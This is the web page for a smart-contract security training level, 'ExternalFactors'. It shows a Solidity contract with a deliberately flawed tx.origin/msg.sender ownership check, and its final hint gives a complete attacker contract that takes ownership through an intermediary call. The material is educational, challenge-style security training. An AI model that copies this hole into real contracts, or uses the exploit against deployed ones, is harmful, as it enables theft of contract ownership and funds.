<div id="levelCompleteModal" class="w3-modal">
    <div class="w3-modal-content w3-card-4 w3-animate-zoom">
        <header class="w3-container w3-indigo">
        <span onclick="document.getElementById('levelCompleteModal').style.display='none'"
              class="w3-button w3-display-topright">&times;</span>
            <h2>Congratulations!</h2>
        </header>
        <div class="w3-container header">
            <p>You completed ExternalFactors!</p>
            <p>You are now ready to move onto the next level</p>
        </div>
        <footer class="w3-container w3-padding w3-indigo">
            <a href="/survey" class="w3-button w3-left w3-amber">I've Had Enough</a><a href="/games/forcedPayments" class="w3-button w3-right w3-green">Next Level</a>
        </footer>
    </div>
</div>

<div class="w3-container w3-margin w3-card-4 header">
    <div class="w3-cell-row">
        <div class="w3-cell w3-cell-bottom">
            <h2>ExternalFactors</h2>
        </div>
        <div class="w3-cell w3-cell-middle" style="text-align: right">
            Difficulty: <span class="w3-tag w3-yellow">4/10</span>
        </div>
    </div>

    <hr>

    <h3>Beat This Level</h3>
    <p>To beat this level, become the owner of the contract</p>
    <p>You will need to create and deploy your own smart contract to beat this level. Use <a href="https://remix.ethereum.org">Remix</a> to do this.</p>

    <button id="hintButton" class="w3-button w3-amber w3-margin" onclick="getHint();">Get Hint (2)</button>
    <div id="HintText" style="display: none;"></div>
</div>

<div class="w3-panel w3-card-4 header w3-margin">
    <h4>ExternalFactors.sol</h4>
    <div id="deployedContractAddress" class="w3-margin"><button id="deployButton" onclick="deployContract();" class="w3-button w3-orange w3-margin">Deploy</button></div>
    <div id="transactionInfo" class="w3-margin"></div>
    <div id="userErrors" class="w3-text-red w3-margin"></div>
    <div id="contractInterface" style="display: none;">
        <div class="w3-bar">
            <div class="w3-bar-item">
                <button onclick="viewOwner();" class="w3-button w3-blue">View Owner</button>
            </div>
            <div class="w3-bar-item">
                <div id="viewOwner"></div>
            </div>
        </div>
    </div>

    <pre><code class="Javascript Tomorrow">
pragma solidity ^0.5.3;

contract externalFactors {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function claimOwnership() external {
        if (tx.origin != msg.sender) {
            owner = msg.sender;
        }
    }
}
</code></pre>
</div>
<script>
hljs.initHighlightingOnLoad();
var abi = [{"constant":false,"inputs":[],"name":"claimOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"}];
var externalFactorsContract = web3.eth.contract(abi);
var externalFactorsInstance;

function deployContract() {
    var externalFactors = externalFactorsContract.new(
            {
                from: web3.eth.accounts[0],
                data: '0x608060405234801561001057600080fd5b50336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610175806100606000396000f3fe608060405234801561001057600080fd5b5060043610610053576000357c0100000000000000000000000000000000000000000000000000000000900480634e71e0c8146100585780638da5cb5b14610062575b600080fd5b6100606100ac565b005b61006a610124565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3373ffffffffffffffffffffffffffffffffffffffff163273ffffffffffffffffffffffffffffffffffffffff1614151561012257336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff168156fea165627a7a72305820379c289c3f370d1e7e50feb780ae3d2669614d61efff038f3bb8b9bbef1b147d0029',
                gas: '4700000'
            }, function (e, contract) {
                console.log(e, contract);
                transactionPending(contract);
                if (typeof contract.address !== 'undefined') {
                    console.log('Contract mined! address: ' + contract.address + ' transactionHash: ' + contract.transactionHash);
                    //Add dApp Address to Local Storage
                    localStorage.setItem("externalFactorsAddr", contract.address);
                    getInstance();
                    document.getElementById('transactionInfo').innerHTML = "";
                    updateUI();
                }
            })
}

function transactionPending(contract){
    var Tx = contract.transactionHash;
    document.getElementById('transactionInfo').innerHTML = "<i class=\"fas fa-spinner w3-spin\"></i> Transaction <a target=\"_blank\" rel=\"noopener noreferrer\" href='https://ropsten.etherscan.io/tx/"+Tx+"'>" + Tx + "</a>  Pending... (This can take a minute)";
}

function updateUI(){
    refreshInfo();
    //Display dApp UI
    document.getElementById("contractInterface").style.display="block";
    document.getElementById('deployedContractAddress').innerHTML = "Address: <a target=\"_blank\" rel=\"noopener noreferrer\" href='https://ropsten.etherscan.io/address/"+externalFactorsInstance.address+"'>" + externalFactorsInstance.address + "</a>" +
    " <i id='removeBtn' title='Remove Contract' class=\"far fa-trash-alt w3-text-red\" onclick='removeContract(\"externalFactorsAddr\");'></i>";
}
//If the contract has already been deployed, get instance from localstorage variable
function getInstance(){
    var externalFactorsAddr = localStorage.getItem("externalFactorsAddr");
    externalFactorsInstance = externalFactorsContract.at(externalFactorsAddr);
    console.log(externalFactorsInstance);
}

function viewOwner(){
    var viewOwner = document.getElementById('viewOwner');
    viewOwner.innerHTML = '<i class="fas fa-spinner w3-spin"></i>';
    externalFactorsInstance.owner.call(function(error, result){
        viewOwner.innerHTML = result;
        if(result != web3.eth.accounts[0]){
            localStorage.setItem("externalFactorsComplete", "true");
            completedStatus();
            document.getElementById('levelCompleteModal').style.display='block';
            clearInterval(updateInfo);
        }
    });
}

var Level = 1;
function getHint(){

    var hintText = document.getElementById('HintText');
    var hintBtn = document.getElementById('hintButton');
    hintText.style.display = "block";

    if(Level == "1"){
        hintText.innerHTML = "<p>msg.sender and tx.origin are not the same.</p>";
        hintBtn.innerHTML = "Hint (1/2)";
        Level = 2;
    } else if (Level == "2"){
        hintText.innerHTML += "<p>If a contract calls claimOwnership it will have a different msg.sender to the tx.origin.</p>";
        hintBtn.innerHTML = "Tell me how to do it";
        Level = 3;
    } else if (Level == "3"){
        hintText.innerHTML += "<pre><code class=\"Javascript Tomorrow\">" +
                "pragma solidity ^0.5.2;\n" +
                "\n" +
                "contract externalFactors {\n" +
                "    function claimOwnership() external {}\n" +
                "}\n" +
                "\n" +
                "contract completeEF {\n" +
                "    externalFactors EF = externalFactors(**Deployed Contract Address**);\n" +
                "    \n" +
                "    constructor() public payable {}\n" +
                "\n" +
                "    function sendTransaction() external{\n" +
                "        EF.claimOwnership();\n" +
                "    }\n" +
                "}" +
                "</code></pre>";
        hintBtn.innerHTML = "Hint (2/2)";
        hintBtn.style.display = "none";
        document.querySelectorAll('pre code').forEach((block) => {
            hljs.highlightBlock(block);
        });
    }
}

var updateInfo;
function refreshInfo(){
    //Call every 10 seconds.
    updateInfo = setInterval(function() {
        viewOwner();
    }, 10000);
}

//Check LocalStorage to see if the contract has been deployed.
if (localStorage.getItem("externalFactorsAddr")){
    //Add Contract to web3.eth.contract
    getInstance();
    updateUI();
    viewOwner();
}
</script>